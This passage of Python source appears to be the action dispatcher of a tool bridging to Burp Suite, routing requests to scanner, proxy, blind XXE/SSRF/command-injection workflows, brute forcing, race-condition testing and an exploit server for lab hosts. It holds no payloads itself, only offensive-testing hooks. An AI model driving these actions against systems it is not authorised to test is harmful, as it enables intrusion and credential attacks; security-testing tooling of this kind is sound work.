        return _bridge.get_scanner_issues(count, offset, severity_filter)
    elif action == "proxy_history":
        return _bridge.get_proxy_history(count, offset)
    elif action == "proxy_search":
        return _bridge.search_proxy_history(regex, count, offset)
    elif action == "websocket_history":
        return _bridge.get_websocket_history(count, offset)
    elif action == "websocket_search":
        return _bridge.search_websocket_history(regex, count, offset)
    elif action == "organizer":
        return _bridge.get_organizer(count, offset)
    elif action == "organizer_search":
        return _bridge.search_organizer(regex, count, offset)
    elif action == "set_intercept":
        return _bridge.set_intercept(enabled)
    elif action == "set_scanner":
        return _bridge.set_scanner_running(enabled)
    elif action == "get_config":
        return _bridge.get_project_config()
    elif action == "set_config":
        return _bridge.set_project_config(json_config)
    elif action == "workflow_blind_xxe":
        return _bridge.blind_xxe_workflow(url, param, method, template)
    elif action == "workflow_blind_ssrf":
        return _bridge.blind_ssrf_workflow(url, param, method)
    elif action == "workflow_blind_cmdi":
        return _bridge.blind_cmdi_workflow(url, param, method)
    elif action == "workflow_scanner":
        return _bridge.scanner_results_workflow(severity_filter)
    elif action == "workflow_proxy_analysis":
        return _bridge.proxy_analysis_workflow(url)
    elif action == "plugin_jwt":
        return _bridge.plugin_jwt_analysis(url, method, headers, body, template)
    elif action == "plugin_js_mining":
        # template field used as comma-separated JS URLs
        js_urls = [u.strip() for u in template.split(",") if u.strip()]
        return _bridge.plugin_js_mining(js_urls if js_urls else [url])
    elif action == "turbo_race":
        return _bridge.turbo_intruder_race_condition(url, method, headers, body, count)
    elif action == "turbo_brute":
        wordlist = [w.strip() for w in template.split(",") if w.strip()] if template else None
        return _bridge.turbo_intruder_brute_force(url, method, param, body, wordlist, count)
    elif action == "param_miner":
        return _bridge.param_miner_workflow(url, method, headers, body)
    elif action == "active_scan_plus_plus":
        return _bridge.active_scan_plus_plus_info()
    elif action == "hackvertor":
        return _bridge.hackvertor_encode(body or url, encoding=param)
    elif action == "sequencer":
        # template field used as comma-separated token samples
        samples = [t.strip() for t in template.split(",") if t.strip()]
        return _bridge.sequencer_token_analysis(samples)
    elif action == "enable_rest_api":
        return _bridge.enable_rest_api()
    elif action == "bchecks":
        return _bridge.bchecks_info()
    elif action == "http_smuggler":
        return _bridge.http_smuggler_info()
    elif action == "exploit_server":
        # Store and deliver exploit via exploit server
        return exploit_server_impl(
            exploit_host=url,
            lab_host=tab_name,
            exploit_html=body,
            delivery_method=param or "iframe_hash",
        )
    elif action == "rest_api":
        return _bridge.burp_rest_api_call(endpoint=url or "/", method=method, body=body, api_key=template)
    else:
        return {"error": f"Unknown action: {action}"}
